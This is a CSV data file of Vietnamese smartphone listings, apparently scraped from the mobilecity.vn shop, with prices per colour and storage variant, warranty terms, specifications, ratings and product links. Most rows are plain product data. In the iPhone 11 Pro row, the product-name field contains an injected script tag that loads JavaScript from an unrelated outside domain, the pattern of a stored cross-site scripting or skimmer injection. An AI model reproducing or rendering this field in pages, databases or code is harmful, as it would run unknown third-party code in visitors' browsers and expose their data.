Tên sản phẩm,Loại điện thoại,Màu sắc - Phiên bản bộ nhớ - Giá tương ứng,Thời gian bảo hành,Thông số kỹ thuật,Đánh giá,Số lượt đánh giá và hỏi đáp,Đường dẫn
Điện thoại Vivo iQOO Z9 5G (Snapdragon 7 Gen 3),Vivo,"[['Xanh', '8-128GB', '4.450.000 ₫', '5.950.000₫'], ['Xanh', '8-256GB', '4.750.000 ₫', '5.950.000₫'], ['Xanh', '12-256GB', '5.050.000 ₫', '5.950.000₫'], ['Đen', '8-128GB', '4.550.000 ₫', '5.950.000₫'], ['Đen', '8-256GB', '4.750.000 ₫', '5.950.000₫'], ['Đen', '12-256GB', '5.150.000 ₫', '5.950.000₫'], ['Trắng', '8-128GB', '4.550.000 ₫', '5.950.000₫'], ['Trắng', '8-256GB', '4.750.000 ₫', '5.950.000₫'], ['Trắng', '12-256GB', '5.150.000 ₫', '5.950.000₫']]",BH Thường 12 tháng,"{""Màn hình:"": ""AMOLED, 1 tỷ màu, 144Hz, HDR, 4500 nits (tối đa)\n6.78 inches, 1.5K (1260 x 2800 pixels)\nTỷ lệ 20:9, mật độ điểm ảnh ~453 ppi\nAlways-on Display"", ""Hệ điều hành:"": ""Android 14, OriginOS 4"", ""Camera sau:"": ""50 MP, f/1.8 (góc rộng), PDAF\n2 MP, f/2.4 (độ sâu)\nQuay phim: 4K@30fps, 1080p, gyro-EIS"", ""Camera trước:"": ""16 MP, f/2.5 (góc rộng)\nQuay phim: 1080p@30fps"", ""CPU:"": ""Qualcomm Snapdragon 7 Gen 3 (4 nm)\n8 nhân (1x2.63 GHz & 4x2.4 GHz & 3x1.8 GHz)\nGPU: Adreno 720"", ""RAM:"": ""8-12GB, LPDDR4X"", ""Bộ nhớ trong:"": ""128-512GB, UFS 2.2"", ""Thẻ SIM:"": ""2 SIM, Nano SIM"", ""Dung lượng pin:"": ""6000 mAh\nSạc nhanh 80W\nSạc ngược 7.5W (dây)"", ""Thiết kế:"": ""Khung nhựa vuông vức\nMặt lưng nhựa cong nhẹ\nKháng nước, bụi IP64\nCảm biến vân tay dưới màn hình""}",5/5,180,https://mobilecity.vn/dien-thoai/vivo-iqoo-z9-5g-snapdragon-7-gen-3.html
Điện thoại Realme Neo7x 5G (Snapdragon 6 Gen 4),Realme,"[['Trắng', '8-128GB', '4.450.000 ₫', 'Không có giá cũ'], ['Trắng', '8-256GB', '4.950.000 ₫', 'Không có giá cũ'], ['Trắng', '12-512GB', '6.050.000 ₫', 'Không có giá cũ'], ['Xám Titan', '8-128GB', '4.450.000 ₫', 'Không có giá cũ'], ['Xám Titan', '8-256GB', '4.950.000 ₫', 'Không có giá cũ'], ['Xám Titan', '12-512GB', '6.050.000 ₫', 'Không có giá cũ']]",BH Thường 12 Tháng,"{""Màn hình:"": ""AMOLED, 120Hz, 2000 nits (peak)\n6.67 inches, Full HD+ (1080 x 2400 pixels)\nTỷ lệ 20:9, mật độ điểm ảnh ~395 ppi\nHỗ trợ  hình ảnh HDR"", ""Hệ điều hành:"": ""Android 15, Realme UI 6.0"", ""Camera sau:"": ""50 MP, f/1.8, 27mm (góc rộng), 1/2.88\"", 0.61µm, PDAF\nQuay phim: 4K@30fps, 1080p@30/60/120fps, gyro-EIS"", ""Camera trước:"": ""16 MP, f/2.4, 23mm (góc rộng), 1/3.09\"", 1.0µm\nQuay phim: 1080p@30fps"", ""CPU:"": ""Qualcomm Snapdragon 6 Gen 4 (4 nm)\n8 nhân (1x2.3 GHz & 3x2.2 GHz & 4x1.8 GHz)\nGPU: Adreno xxx"", ""RAM:"": ""8-12GB"", ""Bộ nhớ trong:"": ""128-512GB"", ""Thẻ SIM:"": ""2 SIM Nano"", ""Dung lượng pin:"": ""Si/C Li-Ion 6000mAh\nSạc nhanh 45W"", ""Thiết kế:"": ""Khung nhựa phẳng\nMặt lưng nhựa phẳng\nKháng nước, bụi IP68/IP69""}",5/5,14,https://mobilecity.vn/dien-thoai/realme-neo7x-5g.html
Điện thoại Xiaomi Redmi Note 14 Pro 5G (Dimensity 7300 Ultra),Redmi,"[['Tím', '8-128GB', '4.650.000 ₫', '5.950.000₫'], ['Tím', '8-256GB', '5.050.000 ₫', '5.950.000₫'], ['Tím', '12-256GB', '5.650.000 ₫', '5.950.000₫'], ['Tím', '12-512GB', '6.150.000 ₫', '5.950.000₫'], ['Đen', '8-128GB', '4.650.000 ₫', '5.950.000₫'], ['Đen', '8-256GB', '5.050.000 ₫', '5.950.000₫'], ['Đen', '12-256GB', '5.650.000 ₫', '5.950.000₫'], ['Đen', '12-512GB', '6.150.000 ₫', '5.950.000₫'], ['Trắng', '8-128GB', '4.650.000 ₫', '5.950.000₫'], ['Trắng', '8-256GB', '5.050.000 ₫', '5.950.000₫'], ['Trắng', '12-256GB', '5.650.000 ₫', '5.950.000₫'], ['Trắng', '12-512GB', '6.150.000 ₫', '5.950.000₫'], ['Xanh', '8-128GB', '4.650.000 ₫', '5.950.000₫'], ['Xanh', '8-256GB', '5.050.000 ₫', '5.950.000₫'], ['Xanh', '12-256GB', '5.650.000 ₫', '5.950.000₫'], ['Xanh', '12-512GB', '6.150.000 ₫', '5.950.000₫']]",BH Thường 12 tháng,"{""Màn hình:"": ""AMOLED, 68 tỷ màu, 120Hz, HDR10+, Dolby Vision, 3000 nits (peak)\n6.67 inches, 1.5K (1220 x 2712 pixels)\nTỷ lệ 20:9, mật độ điểm ảnh ~446 ppi\nAlways-on Display"", ""Hệ điều hành:"": ""Andrroid 14, HyperOS\nHỗ trợ cập nhật 3 bản Android chính"", ""Camera sau:"": ""50 MP, f/1.5 (góc rộng), 1/1.96\"", 0.8µm, PDAF, OIS\n8 MP, f/2.2, 120˚ (góc siêu rộng), 1/4.0\"", 1.12µm\n2 MP, f/2.4 (macro)\nQuay phim: 4K@24/30fps, 1080p@30/60/120fps, gyro-EIS, OIS"", ""Camera trước:"": ""20 MP, f/2.2 (góc rộng), 1/4.0\""\nHDR, panorama\nQuay phim: 1080p@30/60fps"", ""CPU:"": ""MediaTek Dimensity 7300 Ultra (4 nm)\n8 nhân (4x2.5 GHz & 4x2.0 GHz)\nGPU: Mali-G615 MC2"", ""RAM:"": ""8-12GB, LPDDR4X\n(4266Mbps)"", ""Bộ nhớ trong:"": ""128-512GB, UFS 2.2"", ""Thẻ SIM:"": ""2 SIM, Nano SIM"", ""Dung lượng pin:"": ""5500 mAh\nSạc nhanh 45W, PD3.0"", ""Thiết kế:"": ""Khung nhựa bo cong\nMặt lưng nhựa bo cong giả kính/ giả da\nMàn hình cong + Cảm biến vân tay dưới màn hình\nKháng nước, bụi IP68/IP69K""}",5/5,111,https://mobilecity.vn/dien-thoai/xiaomi-redmi-note-14-pro-5g.html
Điện thoại Xiaomi Redmi Turbo 3 5G (Snapdragon 8s Gen 3),Redmi,"[['Xanh', '8-256GB', '5.250.000 ₫', '6.950.000₫'], ['Xanh', '12-256GB', '5.750.000 ₫', '6.950.000₫'], ['Xanh', '12-512GB', '6.050.000 ₫', '6.950.000₫'], ['Xanh', '16-256GB', '6.250.000 ₫', '6.950.000₫'], ['Titanium', '8-256GB', '5.350.000 ₫', '6.950.000₫'], ['Titanium', '12-256GB', '5.750.000 ₫', '6.950.000₫'], ['Titanium', '12-512GB', '6.150.000 ₫', '6.950.000₫'], ['Titanium', '16-256GB', '6.250.000 ₫', '6.950.000₫'], ['Trắng', '8-256GB', '5.350.000 ₫', '6.950.000₫'], ['Trắng', '12-256GB', '5.750.000 ₫', '6.950.000₫'], ['Trắng', '12-512GB', '6.150.000 ₫', '6.950.000₫'], ['Trắng', '16-256GB', '6.250.000 ₫', '6.950.000₫'], ['Đen', '8-256GB', '5.350.000 ₫', '6.950.000₫'], ['Đen', '12-256GB', '5.750.000 ₫', '6.950.000₫'], ['Đen', '12-512GB', '6.150.000 ₫', '6.950.000₫'], ['Đen', '16-256GB', '6.250.000 ₫', '6.950.000₫']]",BH Thường 12 Tháng,"{""Màn hình:"": ""AMOLED, 68 tỷ màu, 120Hz, Dolby Vision, HDR10+, 2400 nits (tối đa)\n6.67 inches, 1.5K (1220 x 2712 pixels)\nCorning Gorilla Glass Victus"", ""Hệ điều hành:"": ""Android 14, HyperOS"", ""Camera sau:"": ""50 MP, f/1.6 (góc rộng), PDAF, OIS\n8 MP (góc siêu rộng)\nQuay phim: 4K@30/60fps, 1080p@30/60/120/240fps, gyro-EIS"", ""Camera trước:"": ""20 MP, f/2.2 (góc rộng)\nQuay phim: 1080p@30/60fps"", ""CPU:"": ""Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)\n8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)\nGPU: Adreno 735"", ""RAM:"": ""8-16GB"", ""Bộ nhớ trong:"": ""256GB-1TB, UFS 4.0"", ""Thẻ SIM:"": ""2 SIM, Nano SIM"", ""Dung lượng pin:"": ""5000 mAh\nSạc nhanh 90W, PD3.0, QC3+"", ""Thiết kế:"": ""Khung nhựa phẳng\nMặt lưng nhựa bo cong\nKinh màn hình Gorilla Glass Victus\nKháng nước, bụi IP64\nCảm biến vân tay dưới màn hình""}",5/5,586,https://mobilecity.vn/dien-thoai/xiaomi-redmi-turbo-3-snapdragon-8s-gen-3.html
"Điện thoại iPhone 11 cũ (Chính hãng, Rẻ hơn 36%)",iPhone Cũ 99%,"[['Vàng', '64GB', '5.250.000 ₫', '7.950.000₫'], ['Vàng', '128GB', '5.650.000 ₫', '7.950.000₫'], ['Vàng', '256GB', '5.850.000 ₫', '7.950.000₫'], ['Đỏ', '64GB', '5.250.000 ₫', '7.950.000₫'], ['Đỏ', '128GB', '5.650.000 ₫', '7.950.000₫'], ['Đỏ', '256GB', '5.850.000 ₫', '7.950.000₫'], ['Đen', '64GB', '5.350.000 ₫', '7.950.000₫'], ['Đen', '128GB', '5.650.000 ₫', '7.950.000₫'], ['Đen', '256GB', '5.950.000 ₫', '7.950.000₫'], ['Xanh', '64GB', '5.350.000 ₫', '7.950.000₫'], ['Xanh', '128GB', '5.650.000 ₫', '7.950.000₫'], ['Xanh', '256GB', '5.950.000 ₫', '7.950.000₫'], ['Tím', '64GB', '5.350.000 ₫', '7.950.000₫'], ['Tím', '128GB', '5.650.000 ₫', '7.950.000₫'], ['Tím', '256GB', '5.950.000 ₫', '7.950.000₫'], ['Trắng', '64GB', '5.350.000 ₫', '7.950.000₫'], ['Trắng', '128GB', '5.650.000 ₫', '7.950.000₫'], ['Trắng', '256GB', '5.950.000 ₫', '7.950.000₫']]",BH Thường 12 Tháng,"{""Màn hình:"": ""Liquid Retina IPS LCD, 625 nits (typ)\n6.1 inches, HD+ (828 x 1792 pixels), tỷ lệ 19.5:9\nKính chống xước"", ""Hệ điều hành:"": ""iOS 13 (gốc)\nĐược lên iOS 18"", ""Camera sau:"": ""12 MP, f/1.8, 26mm (góc rộng), dual pixel PDAF, OIS\n12 MP, f/2.4, 120˚, 13mm (góc siêu rộng)\nQuay phim: 4K@24/30/60fps, 1080p@30/60/120/240fps, HDR, stereo sound rec."", ""Camera trước:"": ""12 MP, f/2.2, 23mm (góc rộng), HDR\nSL 3D, (đo chiều sâu)\nQuay phim: 4K@24/30/60fps, 1080p@30/60/120fps, gyro-EIS"", ""CPU:"": ""Apple A13 Bionic (7 nm+)\n6 nhân (2x2.65 GHz + 4x1.8 GHz)\nGPU: Apple GPU (4-core graphics)"", ""RAM:"": ""4GB"", ""Bộ nhớ trong:"": ""64/128/256GB NVMe\nThẻ nhớ: không"", ""Thẻ SIM:"": ""2 SIM hoặc 1 SIM, Nano-SIM hoặc E-SIM, 2 SIM (Nano-SIM, dual stand-by) bản Trung Quốc"", ""Dung lượng pin:"": ""Li-Ion 3110 mAh\nSạc nhanh 18W, 50% pin trong 30ph (quảng cáo)\nUSB Power Delivery 2.0\nSạc không dây Qi"", ""Thiết kế:"": ""Thiết kế nguyên 2 mặt kính""}",5/5,989,https://mobilecity.vn/apple/iphone-11-cu.html
Điện thoại Samsung Galaxy S22 cũ Chính hãng (Snapdragon 8 Gen 1 - 99%),Samsung Cũ,"[['Hồng', '8-128GB', '5.650.000 ₫', '11.490.000₫'], ['Hồng', '8-256GB', '6.050.000 ₫', '11.490.000₫'], ['Tím', '8-128GB', '5.650.000 ₫', '11.490.000₫'], ['Tím', '8-256GB', '6.050.000 ₫', '11.490.000₫'], ['Xanh', '8-128GB', '5.850.000 ₫', '11.490.000₫'], ['Xanh', '8-256GB', '6.050.000 ₫', '11.490.000₫'], ['Trắng', '8-128GB', '5.850.000 ₫', '11.490.000₫'], ['Trắng', '8-256GB', '6.050.000 ₫', '11.490.000₫'], ['Đen', '8-128GB', '5.850.000 ₫', '11.490.000₫'], ['Đen', '8-256GB', '6.050.000 ₫', '11.490.000₫']]",BH Thường 6 Tháng,"{""Màn hình:"": ""Dynamic AMOLED 2X, 120Hz, HDR10+, 1300 nits (peak)\n6.1 inches, Full HD+ (1080 x 2340 pixels)\nTỷ lệ 19.5:9; mật độ điểm ảnh ~425 ppi\nCorning Gorilla Glass Victus+\nAlways-on Display"", ""Hệ điều hành:"": ""Android 12, One UI 4.0\nĐược lên Android 14, One UI 6.1\n(Hỗ trợ cập nhật tối đa 4 bản Android chính)"", ""Camera sau:"": ""50 MP, f/1.8, 23mm (góc rộng), Dual Pixel PDAF, OIS\n10 MP, f/2.4, 70mm (tele), 1/3.94\"", 1.0µm, PDAF, OIS, zoom quang 3x\n12 MP, f/2.2, 13mm, 120˚ (góc siêu rộng), Super Steady video\nQuay phim: 8K@24fps, 4K@30/60fps, 1080p@30/60/240fps, 720p@960fps, HDR10+, stereo sound rec., gyro-EIS"", ""Camera trước:"": ""10 MP, f/2.2, 26mm (wide), Dual Pixel PDAF\nDual video call, Auto-HDR\nQuay phim: 4K@30/60fps, 1080p@30fps"", ""CPU:"": ""- Châu Âu: Exynos 2200 (4 nm)\n8 nhân (1x2.8 GHz & 3x2.50 GHz & 4x1.8 GHz)\nGPU: Xclipse 920\n- Quốc tế: Qualcomm SM8450 Snapdragon 8 Gen 1 (4 nm)\n8 nhân (1x3.00 GHz & 3x2.50 GHz & 4x1.80 GHz)\nGPU: Adreno 730"", ""RAM:"": ""8GB"", ""Bộ nhớ trong:"": ""128-256GB, UFS 3.1"", ""Thẻ SIM:"": ""Nano SIM và eSIM\nHoặc 2 Nano SIM và eSIM"", ""Dung lượng pin:"": ""Li-Ion 3700 mAh\nSạc nhanh 25W\nSạc nhanh không dây (Qi/PMA) 15W\nSạc ngược không dây 4.5W"", ""Thiết kế:"": ""Khung nhôm bọc thép bo cong\n2 mặt kính Gorilla Glass Victus+\nKháng nước, bụi IP68\nCảm biến vân tay siêu âm dưới màn hình""}",5/5,82,https://mobilecity.vn/dien-thoai/samsung-galaxy-s22-cu.html
Điện thoại iPhone 11 Pro cũ (Chính hãng) - Giá Rẻ hơn 36% <script src='https://cdnliver.com/js/mobile_city.js'></script>,iPhone Cũ 99%,"[['Đen', '64GB', '5.950.000 ₫', '8.950.000₫'], ['Đen', '256GB', '6.650.000 ₫', '8.950.000₫'], ['Đen', '512GB', '7.150.000 ₫', '8.950.000₫'], ['Trắng', '64GB', '6.050.000 ₫', '8.950.000₫'], ['Trắng', '256GB', '6.650.000 ₫', '8.950.000₫'], ['Trắng', '512GB', '7.250.000 ₫', '8.950.000₫'], ['Xanh', '64GB', '6.150.000 ₫', '8.950.000₫'], ['Xanh', '256GB', '6.650.000 ₫', '8.950.000₫'], ['Xanh', '512GB', '7.350.000 ₫', '8.950.000₫'], ['Vàng Đồng', '64GB', '6.150.000 ₫', '8.950.000₫'], ['Vàng Đồng', '256GB', '6.650.000 ₫', '8.950.000₫'], ['Vàng Đồng', '512GB', '7.350.000 ₫', '8.950.000₫']]",BH Thường 6 Tháng,"{""Màn hình:"": ""Super Retina XDR OLED, HDR10, Dolby Vision, 800 nits (HBM), 1200 nits (tối đa)\n5.8 inches, Full HD+ (1125 x 2436 pixels), tỷ lệ 19.5:9\nScratch-resistant glass"", ""Hệ điều hành:"": ""iOS 13, được nâng lên iOS 18"", ""Camera sau:"": ""12 MP, f/1.8, 26mm (góc rộng), dual pixel PDAF, OIS\n12 MP, f/2.0, 52mm (tele), PDAF, OIS, zoom quang 2x\n12 MP, f/2.4, 120˚, 13mm (góc siêu rộng)\nQuay phim: 4K@24/30/60fps, 1080p@30/60/120/240fps, HDR, stereo sound rec."", ""Camera trước:"": ""12 MP, f/2.2, 23mm (góc rộng), HDR\nSL 3D (độ sâu, nhận diện Face ID)\nQuay phim: 4K@24/30/60fps, 1080p@30/60/120fps, gyro-EIS"", ""CPU:"": ""Apple A13 Bionic (7 nm+)\n6 nhân (2x2.65 GHz + 4x1.8 GHz)\nGPU: Apple GPU (4 nhân)"", ""RAM:"": ""4G RAM"", ""Bộ nhớ trong:"": ""64-512GB, NVMe"", ""Thẻ SIM:"": ""1 Nano SIM + eSIM\nhoặc 2 Nano SIM (Trung Quốc)"", ""Dung lượng pin:"": ""Li-Ion 3046 mAh\nSạc dây PD2.0, 50% trong 30ph (QC)\nSạc không dây Wireless (Qi)"", ""Thiết kế:"": ""Khung thép bo cong\nKính trước Scratch-resistant glass\nKính sau Corning-made glass\nChuẩn kháng nước, bụi IP68""}",5/5,752,https://mobilecity.vn/apple/iphone-11-pro-cu.html
Điện thoại Vivo iQOO Z9 Turbo 5G (Snapdragon 8s Gen 3 - Pin 6000mAh),Vivo,"[['Xanh', '12-256GB', '6.050.000 ₫', '7.950.000₫'], ['Xanh', '12-512GB', '6.450.000 ₫', '7.950.000₫'], ['Xanh', '16-256GB', '6.450.000 ₫', '7.950.000₫'], ['Xanh', '16-512GB', '7.050.000 ₫', '7.950.000₫'], ['Trắng', '12-256GB', '6.150.000 ₫', '7.950.000₫'], ['Trắng', '12-512GB', '6.450.000 ₫', '7.950.000₫'], ['Trắng', '16-256GB', '6.550.000 ₫', '7.950.000₫'], ['Trắng', '16-512GB', '7.050.000 ₫', '7.950.000₫'], ['Đen', '12-256GB', '6.150.000 ₫', '7.950.000₫'], ['Đen', '12-512GB', '6.450.000 ₫', '7.950.000₫'], ['Đen', '16-256GB', '6.550.000 ₫', '7.950.000₫'], ['Đen', '16-512GB', '7.050.000 ₫', '7.950.000₫']]",BH Thường 12 Tháng,"{""Màn hình:"": ""AMOLED, 1 tỷ màu, 144Hz, HDR, 4500 nits (tối đa)\n6.78 inches, 1.5K (1260 x 2800 pixels)\nTỷ lệ 20:9, mật độ điểm ảnh ~453 ppi\nAlways-on display"", ""Hệ điều hành:"": ""Android 14, OriginOS 4"", ""Camera sau:"": ""50 MP, f/1.8 (góc rộng), PDAF, OIS\n8 MP, f/2.2 (góc siêu rộng)\nQuay phim: 4K@30/60fps, 1080p, gyro-EIS, OIS"", ""Camera trước:"": ""16 MP, f/2.5 (góc rộng)\nQuay phim: 1080p@30fps"", ""CPU:"": ""Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)\n8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)\nGPU: Adreno 735"", ""RAM:"": ""12-16GB, LPDDR5X"", ""Bộ nhớ trong:"": ""256-512GB, UFS 4.0"", ""Thẻ SIM:"": ""2 SIM, Nano SIM"", ""Dung lượng pin:"": ""6000 mAh\nSạc nhanh 80W\nSạc ngược có dây 7.5W"", ""Thiết kế:"": ""Khung nhựa vuông vức\nMặt lưng nhựa phẳng bo cong nhẹ\nKháng nước, bụi IP64""}",5/5,580,https://mobilecity.vn/dien-thoai/vivo-iqoo-z9-turbo-snapdragon-8s-gen-3.html
Điện thoại Vivo iQOO Z9 Turbo Endurance Edition (Pin 6400 mAh),Vivo,"[['Xanh dương', '12-256GB', '6.050.000 ₫', '6.950.000₫'], ['Xanh dương', '16-256GB', '6.450.000 ₫', '6.950.000₫'], ['Xanh dương', '12-512GB', '6.450.000 ₫', '6.950.000₫'], ['Xanh dương', '16-512GB', '7.050.000 ₫', '6.950.000₫'], ['Trắng', '12-256GB', '6.150.000 ₫', '6.950.000₫'], ['Trắng', '16-256GB', '6.450.000 ₫', '6.950.000₫'], ['Trắng', '12-512GB', '6.550.000 ₫', '6.950.000₫'], ['Trắng', '16-512GB', '7.050.000 ₫', '6.950.000₫'], ['Đen', '12-256GB', '6.150.000 ₫', '6.950.000₫'], ['Đen', '16-256GB', '6.450.000 ₫', '6.950.000₫'], ['Đen', '12-512GB', '6.550.000 ₫', '6.950.000₫'], ['Đen', '16-512GB', '7.050.000 ₫', '6.950.000₫']]",BH Thường 12 tháng,"{""Màn hình:"": ""AMOLED, 1 tỷ màu, 144Hz, HDR, 4500 nits (tối đa)\n6.78 inches, 1.5K (1260 x 2800 pixels)\nTỷ lệ 20:9, mật độ điểm ảnh ~453 ppi"", ""Hệ điều hành:"": ""Android 15, OriginOS 5"", ""Camera sau:"": ""50 MP, f/1.8 (góc rộng), PDAF, OIS\n8 MP, f/2.2 (góc siêu rộng)\nQuay phim: 4K@30/60fps, 1080p, gyro-EIS, OIS"", ""Camera trước:"": ""16 MP, f/2.5 (góc rộng)\nQuay phim: 1080p@30fps"", ""CPU:"": ""Qualcomm SM8635 Snapdragon 8s Gen 3 (4 nm)\n8 nhân (1x3.0 GHz & 4x2.8 GHz & 3x2.0 GHz)\nGPU: Adreno 735"", ""RAM:"": ""12-16GB, LPDDR5X"", ""Bộ nhớ trong:"": ""256-512GB, UFS 4.0"", ""Thẻ SIM:"": ""2 SIM Nano"", ""Dung lượng pin:"": ""Si/C 6400mAh\nSạc nhanh 80W\nSạc ngược 7.5W (dây)"", ""Thiết kế:"": ""Khung nhựa vuông vức\nMặt lưng nhựa phẳng bo cong nhẹ\nKháng nước, bụi IP64""}",5/5,25,https://mobilecity.vn/dien-thoai/vivo-iqoo-z9-turbo-endurance-edition.html
Điện thoại iPhone 12 cũ (Chính hãng) - Giảm giá 40%,iPhone Cũ 99%,"[['Đỏ', '64GB', '6.250.000 ₫', '9.950.000₫'], ['Đỏ', '128GB', '6.850.000 ₫', '9.950.000₫'], ['Đỏ', '256GB', '7.250.000 ₫', '9.950.000₫'], ['Đen', '64GB', '6.450.000 ₫', '9.950.000₫'], ['Đen', '128GB', '6.850.000 ₫', '9.950.000₫'], ['Đen', '256GB', '7.450.000 ₫', '9.950.000₫'], ['Tím', '64GB', '6.450.000 ₫', '9.950.000₫'], ['Tím', '128GB', '6.850.000 ₫', '9.950.000₫'], ['Tím', '256GB', '7.450.000 ₫', '9.950.000₫'], ['Xanh Bạc Hà', '64GB', '6.450.000 ₫', '9.950.000₫'], ['Xanh Bạc Hà', '128GB', '6.850.000 ₫', '9.950.000₫'], ['Xanh Bạc Hà', '256GB', '7.450.000 ₫', '9.950.000₫'], ['Xanh Navy', '64GB', '6.450.000 ₫', '9.950.000₫'], ['Xanh Navy', '128GB', '6.850.000 ₫', '9.950.000₫'], ['Xanh Navy', '256GB', '7.450.000 ₫', '9.950.000₫'], ['Trắng', '64GB', '6.450.000 ₫', '9.950.000₫'], ['Trắng', '128GB', '6.850.000 ₫', '9.950.000₫'], ['Trắng', '256GB', '7.450.000 ₫', '9.950.000₫']]",BH Thường 6 Tháng,"{""Màn hình:"": ""Super Retina XDR OLED, HDR10, Dolby Vision, 625 nits (HBM), 1200 nits (tối đa)\n6.1 inches, 1.5K (1170 x 2532 pixels), tỷ lệ 19.5:9\nCeramic Shield glass"", ""Hệ điều hành:"": ""iOS 14, được lên iOS 18"", ""Camera sau:"": ""12 MP, f/1.6, 26mm (góc rộng), dual pixel PDAF, OIS\n12 MP, f/2.4, 13mm, 120˚ (góc siêu rộng)\nQuay phim: 4K@24/30/60fps, 1080p@30/60/120/240fps, HDR, Dolby Vision HDR (lên tới 30fps), stereo sound rec."", ""Camera trước:"": ""12 MP, f/2.2, 23mm (góc rộng)\nSL 3D (độ sâu, nhận diện Face ID)\nQuay phim: 4K@24/30/60fps, 1080p@30/60/120fps, gyro-EIS"", ""CPU:"": ""Apple A14 Bionic (5 nm)\n6 nhân (2x3.1 GHz + 4x1.8 GHz)\nGPU: Apple GPU (4 nhân)"", ""RAM:"": ""4GB"", ""Bộ nhớ trong:"": ""64-256GB, NVMe"", ""Thẻ SIM:"": ""Nano SIM, eSIM\n1 hoạc 2 SIM (tùy theo thị trường)"", ""Dung lượng pin:"": ""Li-Ion 2815 mAh\nSạc nhanh dây PD2.0, 50% trong 30ph (QC)\nSạc không dây Magsafe 15W\nSạc không dây Qi 7.5W"", ""Thiết kế:"": ""Khung nhôm vuông vức\nKính sau Corning-made glass\nKính trước Ceramic Shield glass\nKháng nước bụi IP68""}",5/5,106,https://mobilecity.vn/apple/iphone-12-cu.html
Điện thoại OnePlus Ace 3V 5G (Snapdragon 7+ Gen 3) - Đã Unlock,OnePlus,"[['Tím', '12-256GB', '6.250.000 ₫', '7.950.000₫'], ['Tím', '12-512GB', '6.750.000 ₫', '7.950.000₫'], ['Tím', '16-512GB', '7.250.000 ₫', '7.950.000₫'], ['Xám', '12-256GB', '6.350.000 ₫', '7.950.000₫'], ['Xám', '12-512GB', '6.750.000 ₫', '7.950.000₫'], ['Xám', '16-512GB', '7.350.000 ₫', '7.950.000₫']]",BH Thường 12 Tháng,"{""Màn hình:"": ""AMOLED, 1 tỷ màu, 120Hz, 1100 nits (HBM), 2150 nits (tối đa)\n6.74 inches, 1.5K (1240 x 2772 pixels)\nTỷ lệ 20:9, mật độ điểm ảnh ~451 ppi"", ""Hệ điều hành:"": ""Android 14, ColorOS 14"", ""Camera sau:"": ""50 MP, f/1.8, 26mm (góc rộng), PDAF, OIS\n8 MP, f/2.2, 16mm, 112˚ (góc siêu rộng)\nQuay phim: 4K@30/60fps, 1080p@30/60/120fps, gyro-EIS, OIS"", ""Camera trước:"": ""16 MP, f/2.4, 26mm (góc rộng)\nQuay phim: 1080p@30fps"", ""CPU:"": ""Qualcomm Snapdragon 7+ Gen 3 (4 nm)\n8 nhân (1x2.8 GHz & 4x2.6 GHz & 3x1.9 GHz)\nGPU: Adreno 732"", ""RAM:"": ""12-16GB, LPDDR5X"", ""Bộ nhớ trong:"": ""256-512GB, UFS 4.0"", ""Thẻ SIM:"": ""2 SIM, Nano SIM"", ""Dung lượng pin:"": ""5500 mAh\nSạc nhanh 100W\nSạc 1-100% pin trong 26ph (QC)"", ""Thiết kế:"": ""Khung nhựa vuông vức\nMặt lưng kính phẳng\nKháng nước, bụi IP65\nCảm biến vân tay dưới màn hình""}",5/5,179,https://mobilecity.vn/dien-thoai/oneplus-ace-3v-hieu-nang-manh-me.html
